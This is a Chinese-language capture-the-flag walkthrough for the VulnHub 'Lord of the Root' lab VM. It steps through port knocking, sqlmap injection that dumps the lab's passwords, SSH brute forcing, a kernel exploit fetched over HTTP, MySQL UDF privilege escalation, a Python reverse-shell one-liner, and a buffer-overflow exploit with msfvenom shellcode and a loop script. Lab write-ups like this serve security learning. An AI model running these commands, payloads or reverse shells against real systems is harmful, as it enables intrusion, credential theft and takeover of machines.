@@ -1,0 +1,854 @@
+# 6-LordOfTheRoot_1.0.1
+
+靶机地址 <https://www.vulnhub.com/entry/lord-of-the-root-101,129/>
+
+难度中等(主要是缓冲区溢出)
+
+![](https://image.3001.net/images/20220330/1648654794_624479ca51b74a1fba8b3.png!small)
+
+## 1.信息收集
+
+### 1.1 nmap挖掘信息
+
+nmap 192.168.75.0/24 -sP 得到目标主机ip 192.168.75.144
+
+![](https://image.3001.net/images/20220330/1648654821_624479e53125f22418579.png!small)
+
+nmap 192.168.75.144 -sS -sV -A -T4 -p- -p- 全端口扫描 1-65535 但是比较耗费时间 -sS
+SYN扫描，只完成三次握手前两次，很少有系统记入日志，默认使用，需要root(admin)权限 -sV 探测端口号版本 -A
+全面系统监测，使用脚本检测，扫描等 -T4 针对TCP端口禁止动态扫描延迟超过10ms
+
+得到 22 端口 ssh 操作系统linux3.X|4.X
+
+![](https://image.3001.net/images/20220330/1648654873_62447a19b741fb4317151.png!small)
+
+### 1.2 ssh查看
+
+ssh ssh@192.168.75.144
+
+发现提示 knock Easy as 1,2,3
+
+意思是敲击三次 端口碰撞
+
+![](https://image.3001.net/images/20220330/1648654895_62447a2f00c1a123d1999.png!small)
+
+### 1.3 端口碰撞
+
+#### 1.3.1 port knocking
+
+端口试探（port
+knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。
+
+端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。
+
+1.3.2要求
+
+端口碰撞要求 知道端口碰撞的序列 否则暴力破解几率很小
+
+Easy as 1,2,3 碰撞序列为1 ，2，3
+
+#### 1.3.3 knock
+
+man knock
+
+![](https://image.3001.net/images/20220330/1648655023_62447aaf4a75bd5ed7fc9.png!small)
+
+linux安装：sudo apt install knockd knock 192.168.75.144 1 2 3 -v 再查看端口 nmap
+192.168.75.144 -sS -sV -A -T4 -p- 可以看到开启了1337端口
+
+![](https://image.3001.net/images/20220330/1648655045_62447ac55ebb4145f0fa3.png!small)
+
+!注意，端口碰撞后开启的端口，只有碰撞的主机ip可以访问 其他未碰撞主机的还是无法访问在kali里面可以访问在win10无法访问
+
+![](https://image.3001.net/images/20220330/1648655069_62447adde69f691b0f9b3.png!small)
+
+![](https://image.3001.net/images/20220330/1648655093_62447af5202030c527e0a.png!small)
+
+### 1.4 1337端口
+
+查看1337 端口 查看页面代码 无信息
+
+![](https://image.3001.net/images/20220330/1648655115_62447b0b0b7d9eb952467.png!small)
+
+#### 1.4.1 robots.txt
+
+查看robots.txt http://192.168.75.144:1337/robots.txt 发现base64编码
+THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
+
+![](https://image.3001.net/images/20220330/1648655129_62447b193fa6e45e0ddaa.png!small)
+
+#### 1.4.2 base解码
+
+echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d echo
+'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d /978345210/index.php 得到目录
+
+![](https://image.3001.net/images/20220330/1648655154_62447b3282a14b82892c2.png!small)
+
+或者用在线工具 http://www.hiencode.com/base64.html
+
+![](https://image.3001.net/images/20220330/1648655167_62447b3f33c56f0c2bc49.png!small)
+
+访问 /978345210/index.php http://192.168.75.144:1337/978345210/index.php 得到登陆界面
+尝试sql注入
+
+![](https://image.3001.net/images/20220330/1648655185_62447b518a9556c98009e.png!small)
+
+## 2\. sqlmap
+
+### 2.1 参考文章
+
+sqlmap 是一个sql注入工具 参考文章 https://www.cnblogs.com/yankaohaitaiwei/p/11802375.html
+
+### 2.2 参数
+
+1\. -u "url" 检测注入点 2.--dbs 列出所有数据库的名字 3.--current-db 列出当前数据库的名字 4.-D 指定一个数据库
+5.--tables 列出表名 6.-T 指定表名 7.--columns 列出所有字段名 8.-C 指定字段 eg: -D security -T
+users -C password,username --dump 9.--dump 列出字段内容 10.-D security --dump
+爆出数据库所有数据
+
+Optimization -o：开启所有优化开关 --predict-output：预测常见的查询输出 --keep-alive：使用持久的HTTP(S)连接 --null-connection：从没有实际的HTTP响应体中检索页面长度
+--threads=THREADS：设置请求的并发数 --forms参数，sqlmap会自动从-u中的url获取页面中的表单进行测试
+
+### post --forms
+
+### 2.3 爆库
+
+这个页面是一个post传参 可以用 --forms来进行爆破 sqlmqp会给出注入点 payload sqlmap -o -u
+http://192.168.75.144:1337/978345210/index.php --forms --dbs [*]
+information_schema [*] mysql [*] performance_schema [*] Webapp
+
+![](https://image.3001.net/images/20220330/1648655209_62447b69b95cb64b40742.png!small)
+
+### 2.4 爆表
+
+    
+    
+    sqlmap -o -u http://192.168.75.144:1337/978345210/index.php --forms -D Webapp --tables   
+    [1 table] +-------+ | Users | +-------+
+
+![](https://image.3001.net/images/20220330/1648655231_62447b7f0ea9b06eb625d.png!small)
+
+### 2.5 爆字段
+
+    
+    
+    sqlmap -o -u http://192.168.75.144:1337/978345210/index.php --forms -D Webapp -T Users --columns
+    [3 columns]
+    +----------+--------------+
+    | Column   | Type         |
+    +----------+--------------+
+    | id       | int(10)      |
+    | password | varchar(255) |
+    | username | varchar(255) |
+    +----------+--------------+
+    
+
+![](https://image.3001.net/images/20220330/1648655249_62447b9174f3e03e2e15c.png!small)
+
+### 2.6 爆字段值
+
+    
+    
+    sqlmap -o -u http://192.168.75.144:1337/978345210/index.php --forms -D Webapp -T Users -C id,password,username --dump
+    [5 entries]
+    +----+----------+------------------+
+    | id | username | password         |
+    +----+----------+------------------+
+    | 1  | frodo    | iwilltakethering |
+    | 2  | smeagol  | MyPreciousR00t   |
+    | 3  | aragorn  | AndMySword       |
+    | 4  | legolas  | AndMyBow         |
+    | 5  | gimli    | AndMyAxe         |
+    +----+----------+------------------+
+    
+
+![](https://image.3001.net/images/20220330/1648655276_62447bac79188bce12323.png!small)
+
+![](https://image.3001.net/images/20220330/1648655290_62447bba83d3ab2466b93.png!small)
+
+### post -r
+
+还可以抓包 保存未.txt文件 用-r
+
+先用burp抓包 post传参需要输入传参内容 提交
+
+![](https://image.3001.net/images/20220330/1648655313_62447bd1b348fa61a2d6d.png!small)
+
+![](https://image.3001.net/images/20220330/1648655326_62447bde5ed7671db7bb4.png!small)
+
+    
+    
+    sqlmap -r post.txt -D Webapp -T Users -C id,password,username --dump
+    
+
+![](https://image.3001.net/images/20220330/1648655361_62447c01eb85b421c460d.png!small)
+
+## 3.ssh爆破
+
+由sqlmap 爆破得到 账户密码 尝试ssh爆破 账号密码
+
+### 3.1 hydra爆破ssh
+
+    
+    
+    hydra -L users.txt -P passwd.txt 192.168.75.144 ssh
+    hydra -L users.xtx -P passwd.txt ssh://192.168.75.144
+    smeagol
+    MyPreciousR00t
+    
+
+![](https://image.3001.net/images/20220330/1648655377_62447c1133d742bacd77b.png!small)
+
+### 3.2MSF爆破ssh
+
+若有用户名和密码字典的话，使用auxiliary/scanner/ssh/ssh_login模块
+若不知道，使用auxiliary/scanner/ssh/ssh_enumusers模块先探测用户名是否存在
+参考：https://blog.csdn.net/huweiliyi/article/details/105590291
+
+    
+    
+    payload options 设置
+    search ssh_login
+    use auxiliary/scanner/ssh/ssh_login //use 0 使用模块
+    show options  //查看参数
+    set rhosts 192.168.75.144 //设置目标ip
+    set user_file /2022/6/users.txt //设置账号本
+    set pass_file /2022/6/passwd.txt //设置密码本
+    exploit //运行 payload
+    session -i 查看结果
+    //得到一个shell
+    session 1 //使用shell
+    
+
+![](https://image.3001.net/images/20220330/1648655400_62447c2819fdee579582b.png!small)
+
+![](https://image.3001.net/images/20220330/1648655410_62447c32d14c203feab2b.png!small)
+
+## 4.提权
+
+### 4.1 exp提权
+
+#### 4.1.1 ssh登录
+
+    
+    
+    ssh smeago@192.168.75.144
+    MyPreciousR00t
+    uname -a  //查看主机操作系统 内核信息
+    hostnamectl//查看主机操作系统 内核信息
+    内核为 Linux 3.19.0-25-generic
+    操作系统为 Ubuntu 14.04.3 LTS
+    
+
+![](https://image.3001.net/images/20220330/1648655436_62447c4c6062d548b9d58.png!small)
+
+#### 4.1.2 搜索exploit
+
+google chrome 搜索 Ubuntu 14.x exploit
+
+![](https://image.3001.net/images/20220330/1648655456_62447c60371196e7cff85.png!small)
+
+    
+    
+    https://www.exploit-db.com/exploits/39166
+    
+
+![](https://image.3001.net/images/20220330/1648655470_62447c6ed9cc85e71d530.png!small)
+
+使用方法
+
+![](https://image.3001.net/images/20220330/1648655488_62447c809a8be97691c87.png!small)
+
+#### 4.1.3 使用exploit
+
+    
+    
+    searchsploit 39166 //在kali本地exploit库搜索
+    locate linux/local/39166.c  //查看位置
+    cp /usr/share/exploitdb/exploits/linux/local/39166.c /2022/6  //复制到目标目录
+    python -m SimpleHTTPServer 8081 // 在/2022/6 打开http服务
+    wget http://192.168.75.144:8081/39166.c //在shell 里面下载exp
+    gcc 39166.c -o 39166 //编译exp
+    ./39166  //执行exp可执行文件
+    
+
+![](https://image.3001.net/images/20220330/1648655504_62447c905972a82e9431b.png!small)
+
+#### 4.1.4 Flag
+
+    
+    
+    cd /root
+    ls
+    cat Flag.txt
+    “There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+    – Gandalf
+    
+
+![](https://image.3001.net/images/20220330/1648655524_62447ca4181073e43dcff.png!small)
+
+### 4.2 udf提权
+
+udf提权条件 root 权限运行mysql 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
+在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
+udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下才可以创建自定义函数
+
+#### 4.2.1 mysql版本，权限
+
+    
+    
+    dpkg -l | grep mysql   --查看历史安装包版本
+    5.5.44
+    ps aux | grep mysql   ---查看mysql进程信息
+    root权限
+    
+
+![](https://image.3001.net/images/20220330/1648655542_62447cb68fbf980553833.png!small)
+
+#### 4.2.2mysql密码
+
+    
+    
+    ls
+    cd 978345210
+    ls
+    cat login.php //查看全部内容
+    grep "password" -rn login.php //查看含有root 的行
+    账号密码
+    root
+    darkshadow
+    
+
+![](https://image.3001.net/images/20220330/1648655560_62447cc80aa7902278f70.png!small)
+
+#### 4.2.3 udf条件
+
+    
+    
+    mysql -uroot -pdarkshadow
+    首先看一下是否满足写入条件：
+    mysql> show global variables like 'secure%';
+    +------------------+-------+
+    | Variable_name    | Value |
+    +------------------+-------+
+    | secure_auth      | OFF   |
+    | secure_file_priv |       |
+    +------------------+-------+
+    是可以进行UDF提权的！
+    查看插件目录：
+    mysql> show variables like '%plugin%';
+    +---------------+------------------------+
+    | Variable_name | Value                  |
+    +---------------+------------------------+
+    | plugin_dir    | /usr/lib/mysql/plugin/ |
+    +---------------+------------------------+
+    插件目录在：/usr/lib/mysql/plugin/
+    
+
+![](https://image.3001.net/images/20220330/1648655575_62447cd703b4ed3e0527c.png!small)
+
+查看是否可以远程登录 若可以远程登陆可以用msf提权 use mysql； select user,host from user; 不能远程登陆
+
+#### 4.2.4 提权
+
+MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。
+BLOB类型实际是个类型系列（TinyBlob、Blob、MediumBlob、LongBlob） 除了在存储的最大信息量上不同外，他们是等同的。
+MySQL的四种BLOB类型： 类型 大小(单位：字节) TinyBlob 最大 255 Blob 最大 65K MediumBlob 最大 16M
+LongBlob 最大 4G
+
+可以利用lib_mysqludf_sys提供的函数执行系统命令，lib_mysqludf_sys： sys_eval，执行任意命令，并将输出返回
+sys_exec，执行任意命令，并将退出码返回。 或者udf exploit提佛那个的函数执行系统命令 do_system
+本次使用lib_mysqludf_sys
+
+    
+    
+    locate lib_mysqludf_sys  //查看lib_mysqludf_sys位置
+    cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so /2022/6
+    //复制lib_mysqludf_sys_32.so到 /2022/6 目录
+    mv lib_mysqludf_sys_32.so udf.so  //重命名为udf.so
+    du udf.so //查看udf.so 文件大小
+    python -m SimpleHTTPServer 8081  //打开本地http服务
+    
+
+![](https://image.3001.net/images/20220330/1648655617_62447d0156641c4c8a03d.png!small)
+
+wget http://192.168.75.140:8081/udf.so //将动态链接库下载到目标主机 tmp目录下 mysql -uroot
+-pdarkshadow //进入mysql create table udf (line blob); //创建表,用于存放本地传来的udf文件的内容。
+insert into udf values(load_file('/tmp/udf.so')); //在表中写入udf文件内容 select * from
+udf into dumpfile'/usr/lib/mysql/plugin/udf.so';
+//将udf文件内容传入新建的udf.so文件中，路径根据自己的@@basedir修改
+
+    
+    
+    create function sys_eval returns strings soname 'udf.so'; 创建自定义函数
+    select * from mysql.func; //查看函数
+    select sys_eval('chmod u+s /usr/bin/find');
+    //调用sys_eval函数来给find命令所有者的suid权限，使其可以执行root命令
+    find / -exec '/bin/sh' \;  //执行提权
+    // !此时是没有框架的 要是想反弹shell 需要有框架
+    // python -c 'import pty;pty.spawn("/bin/bash")'  获得框架
+    // 现在主机用 nc 监听端口有  nc -lvp port
+    // 在使用反弹shell命令进行反弹
+    // python 反弹shell
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("监听主机ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    cd /root
+    ls
+    cat Flag.txt
+    
+
+![](https://image.3001.net/images/20220330/1648655708_62447d5c04bb493fed316.png!small)
+
+![](https://image.3001.net/images/20220330/1648655719_62447d672fb01b6c3cccd.png!small)
+
+### 4.3 缓冲区(buff)
+
+百度百科https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin
+标准函数 strcpy() strcat()，sprintf()，vsprintf()，gets()，scanf(
+
+本机实验
+
+##### ALSR
+
+    
+    
+    缓冲区溢出 我也是刚学
+    很多原理不懂 也是看别人 writeup 做的
+    
+    SECRET文件夹目录 是缓冲区溢出的一个标志目录
+    find / -name SECRET 2>/dev/null // 2>/dev>null 忽略警告值
+    在该目录下 发现三个子目录 每个子目录有一个file文件 
+    
+    有的缓冲区会设置ALSRJ机制 即随机化
+    0 = 关闭
+    1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。
+    2 = 全随机。
+    
+    cat /proc/sys/kernel/randomize_va_space 查看
+    2
+    全随机 
+    参考资料 https://blog.csdn.net/counsellor/article/details/81543197
+    
+
+  
+![](https://image.3001.net/images/20220330/1648655757_62447d8d230481109468f.png!small)
+
+`等一段时间
+查看发现随机变化了`![](https://image.3001.net/images/20220330/1648655776_62447da066f36b4352882.png!small)
+
+    
+    
+    根据文件夹大小来判断 两个为7.2k 一个为5.1k
+    则5.1k是主要文件
+    由于会随机变化 将目录 用base64编码 在转码保存到攻击机
+    
+    cd /door2
+    base64 file
+    
+
+![](https://image.3001.net/images/20220330/1648655791_62447daf9937d99707d4b.png!small)
+
+    
+    
+    gedit base64.txt
+    cat base64.txt | base64 -d > file
+    
+
+![](https://image.3001.net/images/20220330/1648655806_62447dbe1eb75b176d3af.png!small)
+
+    
+    
+    ./file  //执行可执行文件
+    chmod +x file  //给文件授执行权
+    使用python命令快速模糊判断多少个字符会导致程序崩溃。Python有-c参数，允许代码直接从shell执行：
+    
+    ./file $(python -c 'print "A" * 200')  //用2分法查找临界值.
+    
+
+![](https://image.3001.net/images/20220330/1648655819_62447dcbf23a559aff77d.png!small)
+
+##### GDB-peda
+
+    
+    
+    GDB进行分析！peda安装：
+    参考文章：
+    https://blog.csdn.net/aoxixi/article/details/90142736
+    
+    git clone https://github.com/longld/peda.git ~/peda
+    echo "source ~/peda/peda.py" >> ~/.gdbinit
+    想要用某一个插件的时候，只要输入对应命令就行！
+    
+    gdb file    ---gdb分析file文件
+    最好 gdb ./file
+    
+
+![](https://image.3001.net/images/20220330/1648655839_62447ddf4e1e9348b7946.png!small)  
+  
+
+    
+    
+    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+    //当我们不确定界址时 可以生成乱码进行填充
+    
+
+![](https://image.3001.net/images/20220330/1648655854_62447dee77217097f555b.png!small)
+
+    
+    
+    run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am0An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+    
+
+![](https://image.3001.net/images/20220330/1648655868_62447dfc79939d37753ab.png!small)
+
+    
+    
+    0x41376641 in ?? ()
+    查看到错误点在41376641。
+    
+
+![](https://image.3001.net/images/20220330/1648655884_62447e0c8d55ee5fe057a.png!small)
+
+    
+    
+    解析错误点判断偏移量：
+    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41376641
+    [*] Exact match at offset 171
+    查看到偏移量为171。
+    
+
+![](https://image.3001.net/images/20220330/1648655898_62447e1a1e9508a9fd0e8.png!small)
+
+    
+    
+    尝试在偏移量171溢出后情况：
+    run $(python -c 'print "A" * 171 + "B" * 4')
+    EIP: 0x42424242 ('BBBB')
+    可看到EIP已经被填充BBBB可控制。
+    
+
+![](https://image.3001.net/images/20220330/1648655911_62447e27e37621b933efa.png!small)
+
+    
+    
+    Nop空间测试ESP：
+    run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2500')
+    x/s $esp
+    0xffffc530:	'\220' <repeats 200 times>...
+    这时候ESP变了，指向了ffffc530地址，这是nop sled的地址开始处，
+    当ESP指向该地址处后，就会执行栈堆空间的payload获得shell，那么接下来就是要爆破
+    nop sled被访问。
+    
+
+![](https://image.3001.net/images/20220330/1648655928_62447e383c03e2d310b23.png!small)
+
+    
+    
+    恶意payload
+    peda help shellcode  //关于 shellcode 的帮助
+    shellcode search exec // 如何使用 'exec' 搜索所有 shellcode
+    
+
+![](https://image.3001.net/images/20220330/1648655942_62447e464bcffee8a5e13.png!small)
+
+    
+    
+    shellcode display 841 // 这里使用841模块
+    
+
+![](https://image.3001.net/images/20220330/1648655957_62447e55b1dec37b54a9d.png!small)
+
+![](https://image.3001.net/images/20220330/1648655971_62447e631afe8c893edd8.png!small)
+
+    
+    
+    shellcode generate x86/linux exec  生成shellcode
+    
+    checksec
+    
+    0xffffc530 ff ff c5 30
+    反向 \x30\xc5\xff\xff
+    
+    增加nop sled被访问机会 30000
+    run $(python -c 'print "A" * 171 + "\x30\xc5\xff\xff" + "\x90" * 30000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+    
+    // 171个A覆盖后 EIP 指向\x00\xcd\xff\xff shellcode位置
+    
+
+![](https://image.3001.net/images/20220330/1648655987_62447e73774281017d99a.png!small)
+
+![](https://image.3001.net/images/20220331/1648656003_62447e8322999dcd62c58.png!small)
+
+#### 靶机提权
+
+##### objdump 二进制文件分析
+
+objdump工具用来显示二进制文件的信息，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。
+
+    
+    
+    进入door1，只有file文件，尝试分析猜测文件
+    objdump -d --no-show-raw-insn file
+    //查看可执行函数的十六进制显示file
+    
+    -d, --disassemble 显示可执行部分的汇编程序内容
+    --[no-]show-raw-insn 在符号反汇编旁边显示十六进制
+    
+
+##### strings
+
+    
+    
+    在对象文件或二进制文件中查找可打印的字符串
+    strings命令 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。
+    
+    参考文章
+    https://blog.csdn.net/u011500307/article/details/25926111
+    https://wangchujiang.com/linux-command/c/strings.html
+    
+    
+    
+    ls -lahR
+    
+
+![](https://image.3001.net/images/20220331/1648656025_62447e99e7281253d848a.png!small)
+
+    
+    
+    strings door1/file
+    strings door2/file
+    strings door3/file
+    
+    发现只有 door1 目录下的file文件 有strcpy
+    因此这个文件存在缓冲区溢出
+    
+
+![](https://image.3001.net/images/20220331/1648656044_62447eac01d411a97d8a8.png!small)![](https://image.3001.net/images/20220331/1648656060_62447ebc090f7fa84478e.png!small)
+
+![](https://image.3001.net/images/20220331/1648656071_62447ec722568e4a89778.png!small)  
+pwndgb
+
+    
+    
+    参考教程 https://ch4r1l3.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/
+    
+    
+    
+    vim ~/.gdbinit 
+    切换到 pwndgb
+    
+
+![](https://image.3001.net/images/20220331/1648656085_62447ed572a0ff091e5e1.png!small)
+
+    
+    
+    前面我们知道 界址为171 
+    用gdb分析
+    
+    gdb ./file
+    vmmap
+    run
+    
+
+![](https://image.3001.net/images/20220331/1648656099_62447ee30f0777a1b9057.png!small)
+
+    
+    
+    run $(python -c 'print "A"*171 + "B"*4 + "C"*20')
+    
+
+![](https://image.3001.net/images/20220331/1648656113_62447ef10637483f931d9.png!small)
+
+    
+    
+    vmmap
+    我们知道 linux 文件权限有三种
+    r read
+    w write
+    x execute
+    一般 r-x rw-  wx 一般不同时授权 
+    我们看这个程序 
+    0xffffdd00 rwx 说明这个位置我们可以完全控制，因此可以利用shellcode
+    
+
+![](https://image.3001.net/images/20220331/1648656138_62447f0a681a50c1603c2.png!small)
+
+    
+    
+    r $(python -c 'print "A"*171 + "B"*4 + "C"*20')
+    
+
+![](https://image.3001.net/images/20220331/1648656160_62447f20c9b17da259722.png!small)
+
+    
+    
+    缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。常见的坏字符有x0a、x0b、x00
+    
+    
+    
+    现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：
+    
+    
+    
+    #!/usr/bin/env python
+    from __future__ import print_function
+    
+    for x in range(1, 256):
+    print("\\x" + "{:02x}".format(x), end='')
+    
+    print()
+    
+    
+    
+    python zifu.py
+    
+    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+    
+
+![](https://image.3001.net/images/20220331/1648656182_62447f36ee8238bd38395.png!small)
+
+    
+    
+    r $(python -c 'print "A"*171 + "B"*4 + ""')
+    将字符填入""
+    
+    x/256b $esp 查看字符
+    发现乱序 去掉 \x09 
+    \x0a 是换行符 也去掉
+    
+
+![](https://image.3001.net/images/20220331/1648656198_62447f46a04745aea4190.png!small)
+
+    
+    
+    去掉 \x09\x0a 重新填充
+    
+
+![](https://image.3001.net/images/20220331/1648656209_62447f51840f1d2d37478.png!small)
+
+    
+    
+    去掉 \x20 重新填充 
+    无错
+    坏字符为 \x09 \x0a \x20
+    还有 \x00 默认排除空字符
+    
+
+![](https://image.3001.net/images/20220331/1648656219_62447f5be242228919932.png!small)
+
+    
+    
+    msf生成payload
+    payload：
+    -a  框架选择
+    -p 载荷类型
+    
+    LHOST 本机地址
+    LPORT
+    
+    -b 坏字符
+    -e 要使用的编码器
+    -f 编译的语言
+    -c 指定要包含的附加 win32 shellcode 文件
+    -v 载荷的名称
+    
+    
+    
+    Linux：
+    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x09\x0a\x20" EXITFUNC=thread -f c
+    
+    linux2：
+    msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc
+    
+    
+    
+    "\xb8\x77\x45\x9b\x14\xda\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x11\x03\x43\x11\xe2\x82\x2f\x90\x4c\xf5\xe2\xc0\x04\x28\x60\x84\x32\x5a\x49\xe5\xd4\x9a\xfd\x26\x47\xf3\x93\xb1\x64\x51\x84\xca\x6a\x55\x54\xe4\x08\x3c\x3a\xd5\xbf\xd6\xc2\x7e\x13\xaf\x22\x4d\x13"
+    
+    这里跟截图不一样 是因为有生成了一个 每次生成的都不一样 但是都是可以使用的
+    
+
+![](https://image.3001.net/images/20220331/1648656240_62447f70833067a007f04.png!small)
+
+    
+    
+    查看jmp
+    最后需要看看是否有调用jmp到es（因为我们无法控制 eax），查看能够更好的控制漏洞利用的过程，防止不成功。
+    
+    objdump -D file | grep -P 'jmp|call' | grep esp
+    
+    不需要jmp做跳板到shellcode，接下来绕过就是用大量的nop即可！
+    
+
+![](https://image.3001.net/images/20220331/1648656250_62447f7ad7f4c92739cdb.png!small)
+
+##### 查看esp值
+
+    
+    
+    查看esp值
+    run $(python -c 'print "A"*171 + "\xd0\xfe\xe7\xbf" + "\x90"*3000')
+    bfe7a190
+    
+
+![](https://image.3001.net/images/20220331/1648656261_62447f85e0505b9b78633.png!small)
+
+##### exp.sh
+
+    
+    
+    #!/bin/bash
+    while true; do
+    $(find /SECRET -type f -size 5150c) $(python -c 'print "A"*171 + "\x90\xa1\xe7\xbf" + "\x90"*30000 + "\xb8\x77\x45\x9b\x14\xda\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x11\x03\x43\x11\xe2\x82\x2f\x90\x4c\xf5\xe2\xc0\x04\x28\x60\x84\x32\x5a\x49\xe5\xd4\x9a\xfd\x26\x47\xf3\x93\xb1\x64\x51\x84\xca\x6a\x55\x54\xe4\x08\x3c\x3a\xd5\xbf\xd6\xc2\x7e\x13\xaf\x22\x4d\x13"') 2> /dev/null
+    sleep 1
+    done
+    
+    ls -la   ---查看文件大小
